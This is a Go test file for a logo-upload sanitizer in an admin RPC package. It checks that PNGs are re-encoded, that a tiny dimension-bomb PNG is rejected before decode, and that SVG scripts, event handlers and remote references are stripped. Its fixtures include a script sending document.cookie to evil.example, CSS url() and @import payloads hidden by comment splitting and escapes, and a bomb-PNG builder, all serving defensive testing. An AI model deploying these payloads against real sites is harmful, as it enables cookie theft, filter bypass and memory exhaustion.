package adminrpc

import (
	"bytes"
	"encoding/binary"
	"hash/crc32"
	"image"
	"image/color"
	"image/png"
	"runtime"
	"strings"
	"testing"
)

// testPNG encodes a w x h image and appends junk after IEND, standing in
// for a payload smuggled in trailing data or ancillary chunks.
func testPNG(t *testing.T, w, h int, trailer string) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for x := 0; x < w; x++ {
		for y := 0; y < h; y++ {
			img.Set(x, y, color.RGBA{R: uint8(x), G: uint8(y), B: 100, A: 255})
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatal(err)
	}
	buf.WriteString(trailer)
	return buf.Bytes()
}

func TestProcessLogoPNG(t *testing.T) {
	in := testPNG(t, 64, 32, "EVILPAYLOAD")
	out, ext, err := processLogo(in, "image/png")
	if err != nil {
		t.Fatal(err)
	}
	if ext != "png" {
		t.Fatalf("ext = %q, want png", ext)
	}
	if bytes.Equal(out, in) {
		t.Error("stored bytes must be re-encoded, not the upload verbatim")
	}
	if bytes.Contains(out, []byte("EVILPAYLOAD")) {
		t.Error("re-encoding must strip trailing payloads")
	}
	img, err := png.Decode(bytes.NewReader(out))
	if err != nil {
		t.Fatalf("re-encoded PNG does not decode: %v", err)
	}
	if b := img.Bounds(); b.Dx() != 64 || b.Dy() != 32 {
		t.Errorf("re-encoded bounds = %v", b)
	}
}

// bombPNG hand-crafts a tiny PNG whose IHDR declares w x h RGBA pixels but
// whose IDAT is truncated: png.Decode would allocate the whole declared
// pixel buffer before noticing.
func bombPNG(t *testing.T, w, h int) []byte {
	t.Helper()
	var buf bytes.Buffer
	buf.Write([]byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'})
	chunk := func(typ string, data []byte) {
		var length [4]byte
		binary.BigEndian.PutUint32(length[:], uint32(len(data)))
		buf.Write(length[:])
		buf.WriteString(typ)
		buf.Write(data)
		crc := crc32.NewIEEE()
		crc.Write([]byte(typ))
		crc.Write(data)
		var sum [4]byte
		binary.BigEndian.PutUint32(sum[:], crc.Sum32())
		buf.Write(sum[:])
	}
	ihdr := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdr[0:], uint32(w))
	binary.BigEndian.PutUint32(ihdr[4:], uint32(h))
	ihdr[8] = 8 // bit depth
	ihdr[9] = 6 // color type: RGBA
	chunk("IHDR", ihdr)
	chunk("IDAT", []byte{1, 2, 3}) // truncated on purpose
	chunk("IEND", nil)
	return buf.Bytes()
}

func TestProcessLogoRejectsDimensionBombBeforeDecode(t *testing.T) {
	// A ~60-byte upload declaring 30000x30000 RGBA (~3.6 GB decoded) must
	// be rejected from the header alone, before png.Decode allocates the
	// destination pixel buffer.
	in := bombPNG(t, 30000, 30000)
	if len(in) > 128 {
		t.Fatalf("bomb PNG is %d bytes; the point is a tiny input", len(in))
	}
	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	_, _, err := processLogo(in, "image/png")
	runtime.ReadMemStats(&after)
	if err == nil || !strings.Contains(err.Error(), "at most") {
		t.Fatalf("err = %v, want dimension rejection", err)
	}
	if delta := after.TotalAlloc - before.TotalAlloc; delta > 8<<20 {
		t.Errorf("rejection allocated %d bytes; the dimension check must run before decode", delta)
	}
}

func TestProcessLogoRejections(t *testing.T) {
	cases := []struct {
		name        string
		data        []byte
		contentType string
		wantErr     string
	}{
		{"not a png", []byte("plainly not a PNG"), "image/png", "invalid PNG"},
		{"too wide", testPNG(t, maxLogoDim+1, 32, ""), "image/png", "at most"},
		{"too small", testPNG(t, 4, 4, ""), "image/png", "at least"},
		{"unknown type", testPNG(t, 32, 32, ""), "image/gif", "unsupported content type"},
		{"broken xml", []byte(`<svg><circle`), "image/svg+xml", "invalid SVG"},
		{"html root", []byte(`<html><body>hi</body></html>`), "image/svg+xml", "not <svg>"},
		{"empty svg", []byte(`   `), "image/svg+xml", "no <svg> element"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, _, err := processLogo(tc.data, tc.contentType)
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("err = %v, want containing %q", err, tc.wantErr)
			}
		})
	}
}

func TestSanitizeSVGNeutralizesScript(t *testing.T) {
	in := []byte(`<?xml version="1.0"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100" onload="steal()">
  <script>fetch('https://evil.example/' + document.cookie)</script>
  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>evil()</script></body></foreignObject>
  <circle cx="50" cy="50" r="40" fill="#6750A4" onclick="evil()"/>
  <use xlink:href="https://evil.example/remote.svg#x"/>
  <use xlink:href="#local"/>
  <rect width="10" height="10" style="fill: url('https://evil.example/x')"/>
  <style>@import url(https://evil.example/x.css);</style>
  <!-- a comment -->
</svg>`)
	out, ext, err := processLogo(in, "image/svg+xml")
	if err != nil {
		t.Fatal(err)
	}
	if ext != "svg" {
		t.Fatalf("ext = %q, want svg", ext)
	}
	s := string(out)
	for _, banned := range []string{"script", "evil.example", "onload", "onclick", "foreignObject", "@import", "url(", "cookie", "comment"} {
		if strings.Contains(strings.ToLower(s), strings.ToLower(banned)) {
			t.Errorf("sanitized SVG still contains %q:\n%s", banned, s)
		}
	}
	for _, kept := range []string{"<svg", "circle", `fill="#6750A4"`, `href="#local"`, "viewBox"} {
		if !strings.Contains(s, kept) {
			t.Errorf("sanitized SVG lost %q:\n%s", kept, s)
		}
	}
}

// Dropped tokens (comments, disallowed subtrees) must not split style text
// into chunks that individually pass suspiciousCSS but reassemble into a
// banned pattern in the output.
func TestSanitizeSVGSplitCSS(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{
			"comment splits url(",
			`<svg xmlns="http://www.w3.org/2000/svg"><style>.a{fill:ur<!---->l(https://evil.example/x)}</style><circle r="4"/></svg>`,
		},
		{
			"comment splits @import",
			`<svg xmlns="http://www.w3.org/2000/svg"><style>@im<!---->port url(https://evil.example/x.css);</style><circle r="4"/></svg>`,
		},
		{
			"comment splits expression(",
			`<svg xmlns="http://www.w3.org/2000/svg"><style>.a{width:expr<!---->ession(alert(1))}</style><circle r="4"/></svg>`,
		},
		{
			"dropped element splits url(",
			`<svg xmlns="http://www.w3.org/2000/svg"><style>.a{fill:ur<foreignObject></foreignObject>l(https://evil.example/x)}</style><circle r="4"/></svg>`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := sanitizeSVG([]byte(tc.in))
			if err != nil {
				t.Fatal(err)
			}
			s := strings.ToLower(string(out))
			for _, banned := range []string{"url(", "@import", "expression(", "evil.example"} {
				if strings.Contains(s, banned) {
					t.Errorf("sanitized SVG still contains %q:\n%s", banned, out)
				}
			}
			if !strings.Contains(s, "circle") {
				t.Errorf("sanitized SVG lost its shape:\n%s", out)
			}
		})
	}
}

// CSS identifier escapes (`\75 rl(` decodes to `url(` in a browser) must
// not slip banned tokens past the sanitizer, in style attributes or
// <style> elements.
func TestSanitizeSVGEscapedCSS(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{
			"escaped url in style attribute",
			`<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10" style="fill:\75 rl(https://evil.example/beacon)"/><circle r="4"/></svg>`,
		},
		{
			"escaped url in style element",
			`<svg xmlns="http://www.w3.org/2000/svg"><style>.a{fill:u\72 l(https://evil.example/x)}</style><circle r="4"/></svg>`,
		},
		{
			"escaped import in style element",
			`<svg xmlns="http://www.w3.org/2000/svg"><style>@\69 mport url(https://evil.example/x.css);</style><circle r="4"/></svg>`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := sanitizeSVG([]byte(tc.in))
			if err != nil {
				t.Fatal(err)
			}
			s := strings.ToLower(string(out))
			for _, banned := range []string{`\`, "url(", "evil.example"} {
				if strings.Contains(s, banned) {
					t.Errorf("sanitized SVG still contains %q:\n%s", banned, out)
				}
			}
			if !strings.Contains(s, "circle") {
				t.Errorf("sanitized SVG lost its shape:\n%s", out)
			}
		})
	}
}
